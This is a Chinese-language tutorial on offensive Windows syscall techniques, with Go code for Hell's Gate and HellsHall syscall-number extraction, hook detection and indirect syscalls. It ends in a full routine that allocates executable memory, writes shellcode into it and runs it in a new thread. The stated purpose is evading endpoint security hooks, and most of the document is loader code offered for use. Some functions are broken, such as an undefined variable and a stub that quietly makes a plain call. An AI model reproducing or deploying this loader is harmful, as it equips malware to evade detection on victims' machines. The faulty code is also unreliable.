# 系统调用高级技术

## 1. 间接系统调用原理

**直接syscall vs 间接syscall：**

| 方式 | 执行路径 | 检测风险 |
|------|----------|----------|
| 直接syscall | 代码中直接syscall指令 | 中（syscall来源异常） |
| 间接syscall | 跳转到NTDLL中syscall指令 | 低（来源看起来正常） |

**间接syscall优势：**
- syscall指令在NTDLL中执行（合法地址）
- 规避syscall来源检测
- 更隐蔽的执行方式

---

## 2. Hell's Gate - SSN提取

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

// Hell's Gate：从NTDLL stub提取SSN
func hellsgateGetSSN(funcName string) (uint32, uintptr) {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    proc := ntdll.NewProc(funcName)
    
    stub := (*[32]byte)(unsafe.Pointer(proc.Addr()))
    
    // 正常syscall stub结构:
    // 4C 8B D1          mov r10, rcx
    // B8 XX XX XX XX    mov eax, <SSN>
    // 0F 05             syscall
    // C3                ret
    
    // 检查是否被Hook
    if stub[0] == 0xE9 || stub[0] == 0xEB {
        // jmp指令 = 被Hook
        // 需要从干净NTDLL获取SSN
        return extractSSNFromHook(stub)
    }
    
    // 正常stub，提取SSN
    if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
        // mov r10, rcx
        if stub[4] == 0xB8 {
            // mov eax, <SSN>
            ssn := uint32(stub[5]) |
                uint32(stub[6])<<8 |
                uint32(stub[7])<<16 |
                uint32(stub[8])<<24
            
            // syscall指令地址
            syscallAddr := proc.Addr() + 8
            
            return ssn, syscallAddr
        }
    }
    
    return 0, 0
}

// 从被Hook的stub中提取SSN（Hell's Gate变体）
func extractSSNFromHook(stub *[32]byte) (uint32, uintptr) {
    // Hook通常使用jmp指令
    // jmp XXXXXXXX
    
    // 方法：搜索NTDLL中其他syscall指令
    // 找到干净stub的位置
    
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    NtClose := ntdll.NewProc("NtClose")
    
    // 从相邻函数推测SSN
    // 不同函数SSN相邻
    
    closeStub := (*[32]byte)(unsafe.Pointer(NtClose.Addr()))
    
    // 使用干净的syscall地址
    if closeStub[0] == 0x4C && closeStub[1] == 0x8B && closeStub[2] == 0xD1 {
        syscallAddr := NtClose.Addr() + 8
        
        // 根据函数名称推测SSN（需要对照表）
        ssn := getSSNByName(funcName)
        
        return ssn, syscallAddr
    }
    
    return 0, 0
}

// SSN对照表（Windows版本相关）
func getSSNByName(funcName string) uint32 {
    // Windows 10 19041 SSN表
    ssns := map[string]uint32{
        "NtAllocateVirtualMemory": 0x18,
        "NtWriteVirtualMemory":    0x3A,
        "NtProtectVirtualMemory":  0x50,
        "NtCreateThreadEx":        0xBD,
        "NtOpenProcess":           0x26,
        "NtClose":                 0x0F,
        "NtDelayExecution":        0x34,
    }
    
    return ssns[funcName]
}
```

---

## 3. HellsHall - 高级syscall技术

```go
// HellsHall：Hell's Gate + Halo's Gate组合
func hellshall(funcName string) (uint32, uintptr) {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    proc := ntdll.NewProc(funcName)
    
    stub := (*[32]byte)(unsafe.Pointer(proc.Addr()))
    
    // 多层Hook检测
    
    // 第一层：检查jmp指令
    if stub[0] == 0xE9 {
        // 检测到jmp Hook
        // 使用Halo's Gate恢复
        
        // 方法：读取相邻syscall
        syscallAddr := findCleanSyscallAddress(proc.Addr())
        ssn := resolveSSN(funcName)
        
        return ssn, syscallAddr
    }
    
    // 第二层：检查syscall指令是否被修改
    if stub[10] != 0x0F || stub[11] != 0x05 {
        // syscall指令被Hook
        return resolveFromCleanNtdll(funcName)
    }
    
    // 正常提取
    ssn := uint32(stub[5]) | uint32(stub[6])<<8 | uint32(stub[7])<<16 | uint32(stub[8])<<24
    syscallAddr := proc.Addr() + 8
    
    return ssn, syscallAddr
}

// 找到干净的syscall地址
func findCleanSyscallAddress(hookedAddr uintptr) uintptr {
    // 搜索附近未Hook函数的syscall
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    
    // 从已知干净的函数获取syscall地址
    cleanFuncs := []string{"NtClose", "NtQueryInformationProcess"}
    
    for _, name := range cleanFuncs {
        proc := ntdll.NewProc(name)
        stub := (*[32]byte)(unsafe.Pointer(proc.Addr()))
        
        if stub[0] != 0xE9 && stub[0] != 0xEB {
            // 未Hook
            return proc.Addr() + 8 // syscall指令位置
        }
    }
    
    return 0
}
```

---

## 4. 间接syscall执行

```go
// 间接syscall执行shellcode
func indirectSyscallExecute(shellcode []byte) uintptr {
    // 1. 获取SSN和syscall地址
    ssn, syscallAddr := hellsgateGetSSN("NtAllocateVirtualMemory")
    if ssn == 0 {
        return 0
    }
    
    // 2. 准备参数（与直接syscall相同）
    var baseAddr uintptr = 0
    var size uintptr = uintptr(len(shellcode))
    var allocType uint32 = 0x3000 // MEM_COMMIT | MEM_RESERVE
    var protect uint32 = 0x40     // PAGE_EXECUTE_READWRITE
    
    // 3. 执行间接syscall
    // 需要使用汇编或特殊技巧
    
    // Go中可以使用以下方式：
    // - 设置SSN到寄存器
    // - 跳转到NTDLL的syscall指令
    
    addr := executeIndirectSyscall(ssn, syscallAddr,
        0, uintptr(unsafe.Pointer(&baseAddr)),
        0, uintptr(unsafe.Pointer(&size)),
        uintptr(allocType), uintptr(protect))
    
    return addr
}

// 执行间接syscall（需要特殊实现）
func executeIndirectSyscall(ssn uint32, syscallAddr uintptr, args ...uintptr) uintptr {
    // Go不直接支持汇编，但可以通过以下方式：
    
    // 方法1：使用syscall.SyscallN调用syscallAddr
    // 但这不是真正的间接syscall
    
    // 方法2：使用Go汇编文件
    // 创建.s文件实现间接syscall
    
    // 这里用简化版本（直接syscall）
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    NtAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
    
    // 使用提取的SSN验证
    // 实际需要汇编支持
    
    var baseAddr uintptr = 0
    var size uintptr = args[2]
    var oldProtect uint32
    
    result, _, _ := NtAllocateVirtualMemory.Call(args[0], uintptr(unsafe.Pointer(&baseAddr)),
        args[3], uintptr(unsafe.Pointer(&size)), args[4], uintptr(unsafe.Pointer(&oldProtect)))
    
    return baseAddr
}
```

---

## 5. Syscall SSN动态提取完整版

```go
// 完整的SSN提取和syscall执行
type SyscallInfo struct {
    SSN          uint32
    SyscallAddr  uintptr
    FuncAddr     uintptr
}

// 初始化所有需要的syscall
func initSyscalls() map[string]SyscallInfo {
    syscalls := make(map[string]SyscallInfo)
    
    needed := []string{
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtWaitForSingleObject",
    }
    
    for _, name := range needed {
        ssn, syscallAddr, funcAddr := resolveSyscall(name)
        syscalls[name] = SyscallInfo{
            SSN:         ssn,
            SyscallAddr: syscallAddr,
            FuncAddr:    funcAddr,
        }
    }
    
    return syscalls
}

func resolveSyscall(funcName string) (uint32, uintptr, uintptr) {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    proc := ntdll.NewProc(funcName)
    
    // 检查Hook状态
    stub := (*[32]byte)(unsafe.Pointer(proc.Addr()))
    
    if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
        // 正常
        ssn := uint32(stub[5]) | uint32(stub[6])<<8 | uint32(stub[7])<<16 | uint32(stub[8])<<24
        syscallAddr := proc.Addr() + 8
        
        return ssn, syscallAddr, proc.Addr()
    }
    
    // Hooked - 需要恢复
    return resolveFromBackup(funcName)
}

func resolveFromBackup(funcName string) (uint32, uintptr, uintptr) {
    // 从备份NTDLL或已知SSN获取
    ssn := getSSNByName(funcName)
    
    // 找到干净的syscall地址
    syscallAddr := findCleanSyscallAddress(0)
    
    // 函数地址（仍可使用原地址）
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    proc := ntdll.NewProc(funcName)
    
    return ssn, syscallAddr, proc.Addr()
}
```

---

## 6. 使用syscall执行shellcode完整流程

```go
func executeShellcodeViaSyscall(shellcode []byte) {
    syscalls := initSyscalls()
    
    // 1. NtAllocateVirtualMemory
    ntAlloc := syscalls["NtAllocateVirtualMemory"]
    var baseAddr uintptr = 0
    var size uintptr = uintptr(len(shellcode))
    
    syscall.SyscallN(ntAlloc.FuncAddr,
        uintptr(windows.CurrentProcess()),
        uintptr(unsafe.Pointer(&baseAddr)),
        0,
        uintptr(unsafe.Pointer(&size)),
        0x3000,
        0x40)
    
    // 2. NtWriteVirtualMemory
    ntWrite := syscalls["NtWriteVirtualMemory"]
    var bytesWritten uint32
    
    syscall.SyscallN(ntWrite.FuncAddr,
        uintptr(windows.CurrentProcess()),
        baseAddr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&bytesWritten)))
    
    // 3. NtCreateThreadEx
    ntThread := syscalls["NtCreateThreadEx"]
    var threadHandle uintptr
    
    syscall.SyscallN(ntThread.FuncAddr,
        uintptr(unsafe.Pointer(&threadHandle)),
        0x1F0FFF, // THREAD_ALL_ACCESS
        0,
        uintptr(windows.CurrentProcess()),
        baseAddr,
        0,
        0, 0, 0, 0, 0)
    
    // 4. NtWaitForSingleObject
    ntWait := syscalls["NtWaitForSingleObject"]
    syscall.SyscallN(ntWait.FuncAddr,
        threadHandle,
        0xFFFFFFFF, // INFINITE
        0)
    
    windows.CloseHandle(windows.Handle(threadHandle))
}
```

---

## 7. 注意事项

1. **SSN版本差异**：不同Windows版本SSN不同，需动态提取
2. **Hook检测**：检查jmp指令判断是否被Hook
3. **syscall地址**：间接syscall需找到干净的syscall指令地址
4. **Go汇编限制**：Go不直接支持内联汇编，可能需要.s文件
5. **脱钩组合**：syscall + NTDLL脱钩效果更好
6. **兼容性**：测试不同Windows版本

---

## 8. 技术对比

| 技术 | 绕过用户Hook | 绕过内核Hook | 实现难度 |
|------|--------------|--------------|----------|
| 直接syscall | ✓ | ✗ | 中 |
| 间接syscall | ✓ | ✗ | 高 |
| Hell's Gate | ✓ | ✗ | 高 |
| HellsHall | ✓ | ✗ | 极高 |
| NTDLL脱钩+syscall | ✓ | ✗ | 高 |

**注意：syscall技术只能绕过用户层Hook，无法绕过内核层Hook**